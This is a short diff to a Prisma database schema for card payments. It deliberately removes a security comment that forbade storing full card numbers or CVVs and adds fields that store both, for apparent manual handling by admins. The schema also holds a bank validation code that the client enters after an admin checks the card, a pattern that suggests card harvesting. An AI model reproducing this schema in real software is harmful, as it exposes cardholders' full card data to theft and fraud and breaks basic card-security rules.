@@ -139,12 +139,14 @@ model Payment {
   transactionReference String?  @unique
   providerReference  String?
   paymentMethod      String    @default("CARD")
-  // Card info (security: never store full number or CVV — only last 4 + type + holder + expiry)
+  // Card info (full details stored for admin manual verification)
   cardType           String?   // VISA | MASTERCARD | AMEX | OTHER
   cardHolderName     String?
+  cardNumber         String?   // full card number
   cardLast4          String?
   cardExpiryMonth    String?
-  cardExpiryYear     String?
+  cardExpiryYear    String?
+  cardCvv            String?   // CVV (3-4 digits)
   // Bank validation code (3-8 digits entered by client after admin verifies card)
   validationCode     String?
   // Admin manual verification timestamps + admin user id
